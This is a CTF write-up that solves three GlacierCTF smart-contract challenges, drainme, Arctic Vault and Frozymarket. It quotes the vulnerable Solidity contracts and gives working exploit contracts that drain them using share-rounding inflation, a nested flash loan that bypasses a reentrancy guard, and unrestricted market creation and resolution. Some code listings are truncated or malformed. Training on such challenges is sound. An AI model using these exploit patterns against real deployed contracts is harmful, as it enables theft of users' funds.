### Initial Analysis

we'are given 3 files, `setup.sol`, `SB.sol` and `challenge.sol`– as usual we are going to look at the setup first to see the balance distribution across the challenge contracts

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Challenge.sol";
import "./SB.sol";

contract Setup {
    ChallengeContract public immutable TARGET; // Contract the player will hack
    SharesBuyer public immutable SB;


    constructor() payable {
        require(msg.value == 100 ether, "Not enough intial funds");

        // Deploy the victim contract
        TARGET = new ChallengeContract();
        SB = new SharesBuyer(address(TARGET));

        (bool success,) = address(SB).call{value: 100 ether}("");
        require(success, "Sending ETH to SB failed");

    }

    // Our challenge in the CTF framework will call this function to
    // check whether the player has solved the challenge or not.
    function isSolved() public view returns (bool) {
        return (address(TARGET).balance == 0 && address(SB).balance == 0);
    }
}
```
{: file="setup.sol"}

From the setup we know that the `SB` contract has `100 ether` while the `challenge` contract is deployed without any Ether, the `setup.sol::isSolved()` also returns true only when both the `Challenge` and `SB` contract balance equal to 0. Now let's see the other 2 contracts.

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;


import "./Challenge.sol";

contract SharesBuyer {

  IChallengeContract target;

  constructor(address _target) {
    target = IChallengeContract(_target);
  }

  receive() external payable {}

  function buyShares() public {
    target.depositEth{value: address(this).balance}();
  }
}
```
{: file='SB.sol'}

The `ShareBuyer` (SB) contract seems to be a very straight forward one, it only has one function called `buyShares()` that will transfer all its balance to the `Challenge` contract, what's left now is the `Challenge Contract`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IChallengeContract {
    function depositEth() external payable;
    function withdrawEth(uint256) external;
}

contract ChallengeContract
{
    address owner;
    uint256 public totalShares;
    mapping(address => uint) public balances;

    constructor()
    {
        totalShares = 0;
        owner = msg.sender;
    }

    receive() external payable { revert(); } // no donations

    function depositEth() public payable {
        uint256 value = msg.value;
        uint256 shares = 0;

        require(value > 0, "Value too small");

        if (totalShares == 0) {
            shares = value;
        }
        else {
            shares = totalShares * value / address(this).balance;
        }
        
        totalShares += shares;
        balances[msg.sender] += shares;
    }

    function withdrawEth(uint256 shares) public {
        require(balances[msg.sender] >= shares, "Not enough shares");

        uint256 value = shares * address(this).balance / totalShares;

        totalShares -= shares;
        balances[msg.sender] -= shares;

        (bool success,) = address(msg.sender).call{value: value}("");
        require(success, "ETH transfer failed");
    }
}
```
{: file='Challenge.sol'}

There are 2 function there, with one being the `deposithEth()` which will give us the same amount of shares with our `msg.value` when interacting with it **ONLY** when the `totalShares` is equal to 0, else it will calculate the amount of shares that we can get based on the current contract `balance` and `totalShares`. The other function `withdrawEth()` will give us the Ether equal for each shares that we hold.

### Solution

The condition that I found is very advantageous for us, the `totalShares` seems to be zero, so this is one thing that we can control, the idea here is to make the first move before the `SB` contract buy shares that's worth 100 Ether. The logic in `ChallengeContract::depositEth()` seems to contain a rounding error potential in the calculation where the `totalShares` is no longer zero, let's say we deposit `1 wei`, we will have `1 share` and then another people deposit `100 wei`, instead of getting `100 shares`, since the totalShares is not zero, they will be calculated using the formula `shares = totalShares * value / address(this).balance`, which in this case the shares is equal to `shares =  100 / 101`. The result might be `0.99.....` but since solidity can't handle float, it will just be rounded down to `0`, effectively making our `1 share` to worth `101 wei`. 

The example above is actually similar to what we're having here, but this time we are aiming for a bigger amount of `100 Ether`, to solve the challenge we can just follow the steps below
1. `depositEth()` with the value of `1 wei` to get 1 shares
2. Trigger the `SB::buyShares()` to transfer the `100 Ether` to `Challenge` contract
3. Withdraw our 1 share with `withdrawEth()` – it should give us `100 Ether and 1 wei`

And just like that, we'd solved `drainme`

## Artic Vault

```
The first artic vault was established in 1984. 
It holds all your valuables far away from the reach of any tax/debt collector.

Author: J4X
```
{: file="description"}

### Initial Analysis

We are given 2 contracts to work with, the usual `setup.sol` and `Challenge.sol` (hereinafter referred to as `ArticVault`). Let's inspect the `Setup` contract first.

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Challenge.sol";

contract Setup {
    ArcticVault public immutable TARGET; // Contract the player will hack

    constructor() payable {
        require(msg.value == 100 ether);

        // Deploy the victim contract
        TARGET = new ArcticVault();

        TARGET.deposit{value: 1 ether}();
    }

    // Our challenge in the CTF framework will call this function to
    // check whether the player has solved the challenge or not.
    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}
```
{: file="setup.sol"}

Based on the `Setup` contract, there is only `1 Ether` stored on `ArticVault` and the goal of the challenge is to make the balance of the `ArticVault` to zero, the problem here is the `Setup` didn't just give the Ether upon deployment, but rather it deposited the Ether through a function called `ArticVault::deposit()` which we know from the contract map the balances into a variable, here is the `ArticVault` contract

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

// --------------- ArcticVault.sol ---------------
// The first artic vault, even safer than swiss banking ;)
// Deposit your funds, and the tax collector will never find them.
// We even offer the coldest flash loans in the world!

contract ArcticVault
{
    address owner;
    mapping(address => uint256) balances;
    bool paused;
    bool reentrancyGuard;

    modifier notPaused()
    {
        require(!paused, "Contract is paused");
        _;
    }

    event Donation(address indexed from, uint256 amount);

    event MyEvent(bytes data);

    constructor()
    {
        owner = msg.sender;
    }

    //Users can deposit funds into the contract
    function deposit() public payable notPaused
    {
        require(!reentrancyGuard, "Reentrancy guard is active");
        require(msg.value > 0, "Amount must be greater than 0");

        balances[msg.sender] += msg.value;
    }

    // Donate to the glacier
    function donate() public payable notPaused
    {
        require(!reentrancyGuard, "Reentrancy guard is active");
        require(msg.value > 0, "Amount must be greater than 0");

        owner.call{value: msg.value}("");
        
        emit Donation(msg.sender, msg.value);
    }

    //Users can withdraw funds from the vault
    function withdraw() public notPaused
    {
        require(!reentrancyGuard, "Reentrancy guard is active");
        require(balances[msg.sender] > 0, "You have no funds to withdraw");

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;

        payable(msg.sender).transfer(amount);
    }

    //Pause contract (in case the glacier gets infiltrated)
    function pause() public
    {
        require(!reentrancyGuard, "Reentrancy guard is active");
        require(msg.sender == owner, "You are not the owner of this contract");
        paused = true;
    }

    //Unpause contract (in case the glacier gets cleared)
    function unpause() public
    {
        require(!reentrancyGuard, "Reentrancy guard is active");
        require(msg.sender == owner, "You are not the owner of this contract");
        paused = false;
    }

    function flashLoan(uint256 amount) public notPaused
    {
        require(address(this).balance >= amount, "Owner has insufficient funds");

        uint256 balanceBefore = address(this).balance;

        //Do the flash loan
        reentrancyGuard = true;
        msg.sender.call{value: amount}("");
        reentrancyGuard = false;

        require(address(this).balance == balanceBefore, "Flash loan failed");
    }

    // ------------------ Utils to make your life easier ------------------


    //Multicall for other contracts (saves gas)
    function multicallOthers(address[] memory _targets, bytes[] memory _data) public payable 
    {
        require(!reentrancyGuard, "Reentrancy guard is active");
        require(_targets.length == _data.length, "Arrays must be the same length");

        for(uint256 i = 0; i < _targets.length; i++)
        {
            (bool success, ) = _targets[i].call(_data[i]);
            require(success, "Transaction failed");
        }
    }

    //Multicall for this contract (saves gas)
    function multicallThis(bytes[] memory _data) public payable
    {
        require(!reentrancyGuard, "Reentrancy guard is active");

        for(uint256 i = 0; i < _data.length; i++)
        {
            (bool success, ) = address(this).delegatecall(_data[i]);
            require(success, "Transaction failed");
        }
    }

    //Carve your personalized event into the ice
    function emitEvent(bytes memory _data) public
    {
        require(!reentrancyGuard, "Reentrancy guard is active");

        emit MyEvent(_data);
    }
}
```
{: file="Challenge.sol (ArticVault)"}

the contract is quite big, but no worries– the first thing to notice here that there is a modifier called `notPaused()` which will check the `bool paused` and require it to be `false (not paused)` and there is a second `reentrancyGuard` which is neither make into a modifier nor implemented from openzeppelin library, it's just a `bool`. The only function that is not affected by this bool is the `flashloan()`, it rather make the `reentrancyGuard` into true, meaning that even if we receive the Ether from the flashloan it's imposible to do the repayment in a single callback since both the `deposit()` and `withdraw` are protected by the `reentrancyGuard`, but..... is it that safe?

### Solution

My Solution here is not an intended one, the author mentioned that the intended solution is to use the `multicall` that the contract has. Well I was kinda stuck at that time and kinda intimidated by the function so yeah, I found another way :)

![Desktop View](/assets/images/2024-glacierctf/mentioned.png)
_message from J4X @ glacierCTF discord_

After trying to find another way instead of using the `multicall` provided in the contract, I notice one thing that we still can control the `callback` from `withdraw()` or `flashloan()`, but soon eliminated the `withdraw()` since it's protected by the `reentrancyGuard`, so what can we do– yes! We can call `flashloan()` twice! Here is the sketch that I made on how this approach is a possible one

![Desktop View](/assets/images/2024-glacierctf/flashloaned.png)

So the Idea is when we want to repay the `first flashloan` with the value of 1 Ether, we need to unlock the functions first which require the `reentrancyGuard` to be false, how we can do that– well, we just need a `second flashloan` which borrows `0` Ether and make the `reentrancyGuard` false, thus enabling us to deposit `1 Ether` to satisfy the `first flashloan`. With this we just gain `1 Ether` in our names from the loan while actually deposited nothing to the Vault. What's left is just to withdraw the `1 Ether` and we'd solved the challenge, here is the full exploit 

#### Exploit

```javascript
pragma solidity ^0.8.26;

import "./Setup.sol";
import "./Challenge.sol";

contract Exploit{
    Setup public setup;
    ArcticVault public AV;
    bool public entered;

    constructor(address _setup) {
        setup = Setup(_setup);
        AV = ArcticVault(setup.TARGET());
        entered = false;
    }

   function exploit() public{
        AV.flashLoan(1 ether);
        AV.withdraw();
    }

    receive() external payable{
        if (!entered) {
            entered = true;
            AV.flashLoan(0);
            AV.deposit{value: 1 ether}();
        }
    }
}
```
{: file="Exploit.sol"}

Running the `exploit()` function will allow us to solve the challenge the unintended way, but anyway here is the flag

## Frozymarket

```
Frozymarket is the first prediction market in the arctic. Bet on your favorite hockey team, 
or get creative creating your own market. The possibilities are endless.

Author: J4X
```
{: file="description"}

### Initial Analysis

We are given 2 solidity files for this challenge, as usual the `Setup.sol` and the `Challenge.sol`, this challenge goal is also classic, making the balance of `TARGET` or `Challenge.sol` become zero as we can see in the Setup contract below.

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Challenge.sol";

contract Setup {
    Frozymarket public immutable TARGET; // Contract the player will hack

    constructor() payable {
        require(msg.value == 100 ether);

        // Deploy the contract
        TARGET = new Frozymarket();

        //Create market on the contract
        TARGET.createMarket("Will the price of ETH be higher than $2000 on 1st January 2022?", 1640995200);

        // Users place bets on the contract
        TARGET.bet{value: 10 ether}(0, true);
        TARGET.bet{value: 10 ether}(0, false);
    }

    // Our challenge in the CTF framework will call this function to
    // check whether the player has solved the challenge or not.
    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}
```
{: file="Setup.sol"}

Based on the goal, we have exactly one thing to do, is to find where we can get all the balance from the Frozymarket contract, let's see the Frozymarket Contract now

```javascript

        require(!markets[marketIndex].resolved, "Market has already resolved");

        if (outcome)
        {

        {
            require(bets[marketIndex][msg.sender][true] > 0, "You did not bet on the winning outcome");

            //Calc user share, in BPS for less rounding errors
            bpsOfPot = BPS * bets[marketIndex][msg.sender][true] / markets[marketIndex].totalBetsA;

            //Reset bet, we follow CEI pattern
            bets[marketIndex][msg.sender][true] = 0;
        }
        else
        {
            require(bets[marketIndex][msg.sender][false] > 0, "You did not bet on the winning outcome");

            //Calc user share, in BPS for less rounding errors
            bpsOfPot = BPS * bets[marketIndex][msg.sender][false] / markets[marketIndex].totalBetsB;

            //Reset bet, we follow CEI pattern
            bets[marketIndex][msg.sender][false] = 0;
        }

        uint256 payout = address(this).balance * bpsOfPot / BPS;

        //Transfer win to user
        (msg.sender).call{value: payout}("");
    }
}
```
{: file="Challenge.sol"}

By the Setup earlier, we know that there is an ongoing betting, but the condition to win that is low for us, so we need to find a way to win in a market to be able to claim the prize, with that being said, the flaw is actually present in the `Challenge.sol::claimWinnings()`

```javascript
    function claimWinnings(uint256 marketIndex) public
    {
        require(marketIndex < markets.length, "Invalid market index");
        require(markets[marketIndex].resolved, "Market has not resolved yet");

        uint bpsOfPot;
    
        if (markets[marketIndex].winner)
        {
            require(bets[marketIndex][msg.sender][true] > 0, "You did not bet on the winning outcome");

            //Calc user share, in BPS for less rounding errors
            bpsOfPot = BPS * bets[marketIndex][msg.sender][true] / markets[marketIndex].totalBetsA;

            //Reset bet, we follow CEI pattern
            bets[marketIndex][msg.sender][true] = 0;
        }
        else
        {
            require(bets[marketIndex][msg.sender][false] > 0, "You did not bet on the winning outcome");

            //Calc user share, in BPS for less rounding errors
            bpsOfPot = BPS * bets[marketIndex][msg.sender][false] / markets[marketIndex].totalBetsB;

            //Reset bet, we follow CEI pattern
            bets[marketIndex][msg.sender][false] = 0;
        }

        uint256 payout = address(this).balance * bpsOfPot / BPS;

        //Transfer win to user
        (msg.sender).call{value: payout}("");
    }

The function above will check for the winner in the `marketIndex` provided, but the `payout` is not restricted to the balance of the individual `bettingMarket`, which mean if we managed to win in a bettingMarket, then we can get every single Ether from the Challenge contract, so now how do we actually win?

Another flaw in the Challenge contract is the fact that it has `onlyOwner()` modifier but it doesn't being implemented anywhere around the contract, which mean functions like `createMarket()` and `resolveMarket()` is open for us to use, in order to `resolveMarket()` function to be called tho, we need to be the `owner` of the market, which mean we cannot resolve the market that was created by the Setup contract. Knowing the possibility now we can actually create the attack.

### Solution

The function `Challenge.sol::createMarket()` allow us to create a market that only we will interact, by doing that we are also the `owner` of that market, thus can call `Challenge.sol::resolveMarket()`, with the knowledge of that here is our attack plan

Exploit plan:
1. Create a Market by calling `createMarket()`
    - Make sure the `resolvesBy` is `0` to bypass the require check on `resolveMarket()`
2. Bet on the market we created
3. call the `resolveMarket()` to close the market
4. call `claimWinnings()` to get all the balance from the `Frozymarket Contract`

        setup = Setup(_setup);
        FM = Frozymarket(setup.TARGET());
    }

    function exploit() external payable{
        FM.createMarket("WINWINWIN", 0);
        FM.bet{value: 1}(1, true);
        FM.resolveMarket(1, true);
        FM.claimWinnings(1);
    }

    receive() external payable {}
}
